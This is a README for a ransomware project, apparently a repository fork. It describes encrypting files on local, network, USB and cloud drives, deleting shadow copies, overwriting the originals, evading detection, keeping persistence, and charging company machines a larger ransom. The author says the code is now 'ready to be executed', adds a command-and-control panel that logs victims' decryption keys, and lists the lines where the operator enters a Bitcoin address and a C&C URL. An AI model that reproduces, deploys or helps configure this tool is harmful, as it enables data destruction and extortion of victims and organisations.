# CryptoWire ransomware project

CryptoWire - A advanced prof of concept ransomware project without a panel, to prevent skids from abusing it.

Compile : Requires autoit version: v3.3.14.2

Open source: http://ge.tt/1uQXLoa2 (Origanal Code: Unfinished and not ready to go)

Encryption algoritm is AES 256.

The ransomware will encrypt all files stored on: Network drives, Network Shares, Usb Drives/sticks, Externals Disks, Internal Disks, Games (Steam), Onedrive, Dropbox, Google Drive (any cloud service that is running on the machine).

It encrypts all files It's not extension based. The max file size limit is 30 mb, you can change that if you want. The reason is to keep the performance high, while targetting most files.

All shadow copies are being permanently deleted upon execution.

The old non-encrypted files are being overwritten 10 times, and then deleted permanently. Only the encrypted files will be left back. The recyclebin is being overwritten 10 times and deleted permanently as well.

It will avoid heuristic detections by calculating different math algorithms.

Persistence startup.

Machine Domain check. If the victims pc is joined to a domain (company machine) the ransom will be 10x bigger (you can change that).



# Changes
I modified it to turn it into a truly functioning ransomware ready to be executed.

I also went ahead and created a control panel to store and view the Decryption Keys, Computer Names, And also included what version it is.

You still have to hard code some information (Source Code):
  1. Line 244 - Fill out your (Your BTC address)
  2. Line 248 - Fill out your (Your BTC address)
  3. Line 710 - Fill out <url you hosted the C&C on>/bot/log.php
  
 You still have to hard code some information (C&C Panel):
  1. info.php  (Line 36) - $server = mysqli_connect("<hostname>" "<username>", "<password>", "<database>");
  2. include/config.php (Line 2, Line 3, Line 4, Line 5) - Fill out <db server>, <db username>, <db password>, <db database>
  

This ransomware was originally from AutoIt https://github.com/brucecio9999/CryptoWire-Advanced-AutoIt-ransomware-Project

# Images of my custom Control Panel
https://imgur.com/a/7xtfx - Login Page

https://imgur.com/a/f978p - Infected Computers Page

https://imgur.com/a/hOom1 - Configuration Page
